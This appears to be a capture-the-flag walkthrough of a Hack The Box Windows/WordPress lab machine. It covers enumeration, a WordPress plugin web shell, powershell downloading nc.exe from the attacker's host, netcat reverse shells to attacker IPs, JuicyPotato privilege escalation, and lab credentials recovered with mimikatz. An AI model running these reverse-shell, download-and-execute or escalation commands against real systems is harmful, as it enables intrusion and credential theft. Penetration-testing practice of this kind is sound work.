![[Pasted image 20210421173541.png]]

Starting with a basic nmap scan 

`nmap -sC -sV 10.10.10.29`

![[Pasted image 20210421173813.png]]

We have a web server running 

![[Pasted image 20210421173939.png]]

While running the dirbuster scanwe get 

![[Pasted image 20210421174344.png]]

`http://10.10.10.29/wordpress/` gives us

![[Pasted image 20210421174500.png]]

We get a wordpress login page 

![[Pasted image 20210421174627.png]]


By using the credentials we got from the previous box Vaccine 

username : `admin`

password :`P@s5w0rd!`

![[Pasted image 20210422082932.png]]

We can upload themes and plugins on the server 
So we create a php shell to execute commands 

![[Pasted image 20210422083741.png]]

![[Pasted image 20210422084034.png]]

Hosting a python server for getting the nc.exe to the web server 

`python3 -m http.server 800`

`powershell wget http://10.10.17.67:800/nc.exe -OutFile nc.exe`

By running the command on the server we get a reverse shell

`nc.exe -nv 10.10.17.67 4444 -e cmd.exe`

We get the NT\authority\iusr user 

![[Pasted image 20210422085051.png]]

![[Pasted image 20210422085945.png]]

We are intrested in the `SeImpornsonatePrivilege` 

Transferring the JuicyPotato.exe to the victim machine

![[Pasted image 20210422090439.png]]

`jp.exe -t * -p C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -nv 1235 -e cmd.exe"
`

The command is not working 

![[Pasted image 20210422091749.png]]

Using the metasploit we get a shell of the user iis apppool\wordpress

![[Pasted image 20210422094444.png]]


`jp.exe -t * -p C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\wordpress\wp-content\plugins\vVQBjNseXQ\nc.exe -nv 1111 -e cmd.exe"`

`JuicyPotato.exe -t * -l 235 -p shell.exe -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}`

None of the commands worked on my machine 

So I had to spin up the pwnbox and complete the rest of the box over there 

Using metasploit we gain shell and then we upload the nc.exe, JuicyPotato.exe and the shell.bat 

shell.bat 

`START C:\inetpub\wwwroot\wordpress\wp-content\plugins\vVQBjNseXQ\nc.exe -nv 10.10.14.13 7777 -e cmd.exe `

After running the command 

`jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\vVQBjNseXQ\shell.bat -l 1337`

We finally get the NT\Authority shell

![[Pasted image 20210422170427.png]]

![[Pasted image 20210422170448.png]]

After running mimikatz we get the credentials for the user sandra 

![[Pasted image 20210422172426.png]]

username : `sandra`

password : `Password1234!`

